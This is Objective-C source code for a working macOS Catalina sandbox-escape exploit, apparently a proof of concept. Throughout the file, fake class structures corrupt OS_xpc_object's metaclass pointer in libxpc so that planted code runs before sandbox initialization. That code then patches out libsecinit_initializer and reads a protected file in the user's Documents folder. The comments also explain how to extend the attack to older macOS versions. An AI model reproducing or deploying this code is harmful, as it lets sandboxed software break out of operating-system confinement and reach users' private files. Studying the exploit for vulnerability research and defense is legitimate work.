#import <Foundation/Foundation.h>
#import <dlfcn.h>
#include <mach-o/dyld.h>

/* Define some structs and defines we'll need */
struct objc2_class {
    Class isa;
    Class superclass;
    void *cache;
    uintptr_t unused;
    const void *info;
};

struct __objc2_class_ro {
    uint32_t flags;
    uint32_t ivar_base_start;
    uint32_t ivar_base_size;
    uint32_t reserved;
    const void *ivar_lyt;
    const void *name;
    const void *base_meths;
    const void *base_prots;
    const void *ivars;
    const void *weak_ivar_lyt;
    const void *base_props;
};

struct __objc2_meth  {
    const char *name;
    const char *types;
    const void *imp;
};

struct __objc2_meth_list {
    uint32_t entrysize;
    uint32_t count;
    struct __objc2_meth method;
};

#define RW_COPIED_RO (1<<27)
#define RW_REALIZED (1<<31)
#define RO_META (1<<0)

/* Define some external symbols we'll need */
extern void OBJC_METACLASS_$_SNBBase, OBJC_CLASS_$_OS_xpc_object, OBJC_METACLASS_$_OS_xpc_object;
extern void _objc_empty_cache;
static void hacked_initalize(id self, SEL selector);

/* Define a root class for our fake classes. We don't want fake_superclass to be
   a root class, because then the runtime will add an implicit +initialize method
   to it, and it's data isn't very valid. */
   
OBJC_ROOT_CLASS @interface SNBBase
@end

@implementation SNBBase
@end

/* fake_superclass is the root of the exploitation. We set it's rw_data pointer to 
   16 bytes before OBJC_CLASS_$_OS_xpc_object, which happens to be in libxpc.dylib's
   objc_superrefs section.. On the Objective-C runtime in Catalina, it means:
   flags = LOW32(OBJC_CLASS_$_OS_os_transaction); // Doesn't really matter as long as
                                                  // it's a DSC pointer
   firstSubclass shares its address with OBJC_CLASS_$_OS_xpc_object.
   
   Because flag's content is now a DSC pointer, due to the general macOS address space
   bit 31 is on, meaning this class is considered realized by the runtime. If it's not
   considered realized, the runtime will try realizing it and crash because its data
   isn't valid.
   
   This IS affected by the current runtime version, for example it will not work on
   Mojave and older because the rw_data structure is different, but the exploit can be
   altered to support more than one runtime version by having more than 1 pair of
   fake_superclass and fake_subclass, at the cost of a more complicated clean up or
   having no cleanup at all (executing all code inside our +initialize).
   
   However, Mojave and lower do not have the didCallDyldNotifyRegister guard, meaning
   a category can directly override +[OS_xpc_object initialize] early enough to gain
   unsandboxed code execution. This can be combined with this more complicated Catalina
   exploit to support older versions of macOS without complicating cleanup too much.
     */
static const struct objc2_class fake_superclass = {
    (Class) &OBJC_METACLASS_$_SNBBase,
    (Class) &OBJC_METACLASS_$_SNBBase,
    &_objc_empty_cache,
    0,
    ((Class *)&OBJC_CLASS_$_OS_xpc_object) - 2,
};

/* A method list for OS_xpc_object_override. We only need an initialize method,
   which will be called when this class is first accessed. Afterwards we replace
   the entire class struct with the original OS_xpc_object metaclass data. */
static struct __objc2_meth_list fake_subclass_methods = {
    .entrysize = sizeof(struct __objc2_meth),
    .count = 1,
    .method = {
        .name = "initialize",
        .types = "@@:",
        .imp = hacked_initalize,
    }
};

/* Data for our fake_subclass */
static struct __objc2_class_ro fake_subclass_data = {
    .flags = RO_META, // So the runtime doesn't try messing with ivars
    .name = "OS_xpc_object_override", // The runtime is sad if something has no name
    .base_meths = &fake_subclass_methods, // Give it our +initialize
};

/* This class triggers the exploit. When the runtime tries to realize this class,
   it will add it as a subclass for fake_superclass. Due to how that class's data
   points to libxpc's data, it will eventually replace OS_xpc_object's isa (which
   is originally OS_xpc_object's metaclass) with fake_subclass. Because that class
   is accessed before initializing the sandbox, it will call our initialize method
   before then, giving us unsandboxed code execution. */
static struct objc2_class fake_subclass = {
    (Class) &fake_superclass,
    (Class) &fake_superclass,
    &_objc_empty_cache,
    0,
    &fake_subclass_data,
};

/* Add the class to the non-lazy class list, so the runtime will try to realize it. */
static struct objc2_class *class_ptr __attribute__((used)) __attribute((section("__DATA,__objc_nlclslist"))) = &fake_subclass;

static bool escaped_sandbox = false;
static void nop()
{
    escaped_sandbox = true;
}
/* Quick & Dirty function that replaces references to libsecinit_initializer with
   nops, so it doesn't sandbox us. */
static void disable_sandbox_init(void)
{
    static bool once = false;
    if (once) return;
    once = true;

    void *libsecinit_initializer = dlsym(RTLD_DEFAULT, "_libsecinit_initializer");
    printf("Found libsecinit_initializer at %p\n", libsecinit_initializer);

    for (unsigned i = _dyld_image_count(); i--;) {
        if (!strstr(_dyld_get_image_name(i), "libSystem.B.dylib")) continue;
        const struct mach_header_64 *header = (typeof(header)) _dyld_get_image_header(i);
        printf("Found libSystem.B.dylib at %p\n", header);

        const struct segment_command_64 *cmd = (typeof(cmd))(header + 1);
        for (unsigned j = 0; j < header->ncmds; j++, cmd = (typeof(cmd)) ((char*) cmd + cmd->cmdsize)) {
            if (cmd->cmd == LC_SEGMENT_64 && strcmp(cmd->segname, "__DATA") == 0) {
                void *data = (void *)(_dyld_get_image_vmaddr_slide(i) + cmd->vmaddr);
                printf("Found __DATA at %p\n", data);
                for (void **ptr = data; (uintptr_t)ptr < (uintptr_t)data + cmd->vmsize; ptr++) {
                    if (*ptr == libsecinit_initializer) {
                        printf("Replacing libsecinit_initializer reference at %p with a nop\n", ptr);
                        *ptr = nop;
                    }
                }
                break;
            }
        }
    }
}

static void hacked_initalize(id self, SEL selector)
{
    /* If everything is working fine, we should be running before sandbox applied.
       This this point we have unsandbox code execution, but let's fix the mess we
       made so we can continue running and use Objective-C without crashing. */
    
    /* First prevent the sandbox initialization from ever happening. This code
       can run conditionally, if we don't want to *always* run unsandboxed. */
    disable_sandbox_init();
    
    /* OS_xpc_object's ISA is now us, and we're quite a broken ISA. Replace our
       contents with the original OS_xpc_object metaclass. This way we'll also
       not crash when the runtime tries calling our +load. */
    memcpy(&fake_subclass, &OBJC_METACLASS_$_OS_xpc_object, sizeof(fake_subclass));
    
    /* We also destoryed 4 bytes 12 bytes before OBJC_CLASS_$_OS_xpc_object, which
       happens to be in objc_superrefs. Copy them from the follow superref. */
    ((uint32_t *)&OBJC_CLASS_$_OS_xpc_object)[-3] = ((uint32_t *)&OBJC_CLASS_$_OS_xpc_object)[-1];
}

/* Our main function can be anything. If the exploit ran successfully, it will be
   called as usual, with a fully functional Objective-C runtime, but without being
   sandboxed. */
int main()
{    
    if (!escaped_sandbox) {
        NSLog(@"Failed to escape sandbox");
        return 2;
    }
    NSError *error = nil;
    NSString *path = [NSString stringWithFormat:@"/Users/%@/Documents/SecretDocument.txt", NSUserName()];
    NSLog(@"Attempting to read protected file: %@", path);
    NSData *secret = [NSData dataWithContentsOfFile:path
                                             options:0
                                               error:&error];
    if (secret) {
        NSLog(@"Escaped sandbox! The contents are: %@", [secret debugDescription]);
        return 0;
    }
    NSLog(@"Sandbox escaped, but failed to read file: %@", error);

    return 1;
}